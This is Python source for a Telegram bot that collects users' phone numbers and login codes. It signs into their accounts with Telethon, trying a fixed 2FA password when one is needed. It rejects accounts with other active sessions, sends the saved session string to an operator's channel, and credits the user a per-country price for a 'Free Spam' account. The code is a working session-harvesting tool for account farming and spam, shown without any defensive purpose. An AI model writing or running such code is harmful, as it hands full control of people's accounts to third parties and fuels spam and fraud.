from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardRemove
from bot.config import API_ID, API_HASH, CHANNEL_ID, SESSION_2FA_PASSWORD
from bot.utils import storage
from telethon import functions
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import asyncio, time, os, tempfile

user_state = {}

def init(app: Client):
    @app.on_message(filters.command("start") & filters.private)
    async def start_command(client: Client, message: Message):
        user_id = message.from_user.id
        storage.register_user(user_id)
        user_state[user_id] = {"step": "awaiting_number"}
        await message.reply_text(
            "🎉 Welcome to Robot!\n\nEnter your phone number with the country code.\nExample: +62xxxxxxxxx",
            reply_markup=ReplyKeyboardRemove()
        )

    @app.on_message(filters.private & filters.text)
    async def handle_steps(client: Client, message: Message):
        user_id = message.from_user.id
        if user_id not in user_state:
            return

        step_data = user_state[user_id]
        text = message.text.strip()

        if step_data["step"] == "awaiting_number":
            phone = text
            user_state[user_id].update({
                "phone": phone,
                "step": "awaiting_code",
                "start_time": time.time()
            })
            telethon_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await telethon_client.connect()

            try:
                sent = await telethon_client.send_code_request(phone)
                user_state[user_id].update({
                    "telethon": telethon_client,
                    "phone_code_hash": sent.phone_code_hash
                })
                await message.reply_text("✅ OTP has been sent. Now enter the code you received.")
            except Exception as e:
                await telethon_client.disconnect()
                user_state.pop(user_id, None)
                return await message.reply_text(f"❌ Failed to send OTP:\n{e}")

        elif step_data["step"] == "awaiting_code":
            phone = step_data["phone"]
            telethon_client = step_data["telethon"]
            phone_code_hash = step_data["phone_code_hash"]
            start_time = step_data["start_time"]

            if time.time() - start_time > storage.get_verify_time():
                await telethon_client.disconnect()
                user_state.pop(user_id, None)
                return await message.reply_text("⏱️ Verification time expired. Please /start again.")

            try:
                await telethon_client.sign_in(phone, text)
            except SessionPasswordNeededError:
                try:
                    await telethon_client.sign_in(password=SESSION_2FA_PASSWORD)
                except Exception as e:
                    await telethon_client.disconnect()
                    user_state.pop(user_id, None)
                    return await message.reply_text(f"❌ 2FA password incorrect:\n{e}")
            except Exception as e:
                await telethon_client.disconnect()
                user_state.pop(user_id, None)
                return await message.reply_text(f"❌ Verification failed:\n{e}")

            try:
                sessions = await telethon_client(functions.account.GetAuthorizationsRequest())
                if len(sessions.authorizations) > 1:
                    await telethon_client.disconnect()
                    user_state.pop(user_id, None)
                    return await message.reply_text("📵 Account has multiple active sessions. Rejected.")

                session_str = telethon_client.session.save()

                # Use temp file for session
                with tempfile.NamedTemporaryFile(delete=False, suffix=".session", mode='w+') as tmp_file:
                    tmp_file.write(session_str)
                    tmp_file_path = tmp_file.name

                await client.send_document(
                    chat_id=CHANNEL_ID,
                    document=tmp_file_path,
                    caption=(
                        f"✅ New verified session\n"
                        f"User: `{user_id}`\nPhone: `{phone}`"
                    )
                )

                # Get country code dynamically
                country_code = phone.lstrip("+")[:3] if phone.startswith("+") else phone[:3]
                rates = storage.get_country_rates()
                price = rates.get(country_code, 0)
                storage.update_balance(user_id, price)

                await message.reply_text(
                    f"🎉 Account verified successfully!\n\n"
                    f"Number: {phone}\n"
                    f"Price: ${price:.2f}\n"
                    f"Status: Free Spam\n\n"
                    f"The balance has been updated accordingly."
                )

            except Exception as e:
                await message.reply_text(f"⚠️ Unexpected error occurred:\n{e}")
            finally:
                await telethon_client.disconnect()
                if 'tmp_file_path' in locals() and os.path.exists(tmp_file_path):
                    os.remove(tmp_file_path)
                user_state.pop(user_id, None)
